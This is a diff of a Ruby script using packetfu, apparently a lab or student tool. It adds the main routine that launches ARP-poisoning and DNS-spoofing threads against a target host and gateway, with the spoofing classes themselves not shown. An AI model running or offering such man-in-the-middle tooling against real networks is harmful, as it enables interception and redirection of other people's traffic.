@@ -1,6 +1,6 @@
 #!/usr/bin/env ruby
 
-
+#requirements
 require 'rubygems'
 require 'packetfu'
 require 'thread'
@@ -39,3 +39,25 @@ end # Trollop
 
 # Check if user is running as root
 raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0
+
+
+
+# Start Spoofing
+begin 
+    arp = ARPSpoof.new(opts[:host], opts[:mac], opts[:gate], opts[:route], opts[:iface])
+    dns = DNSSpoof.new(opts[:spoof], opts[:host], opts[:mac], opts[:iface])
+    arp_thread = Thread.new{ arp.poison }
+    dns_thread = Thread.new{ dns.start  }
+
+    dns_thread.join
+    arp_thread.join
+
+rescue Interrupt
+
+    puts "\n\nKilling ARP Poision Thread"
+    arp.stop
+    Thread.kill(arp_thread)
+
+    puts "killing dns spoof thread"
+    Thread.kill(dns_thread)
+end
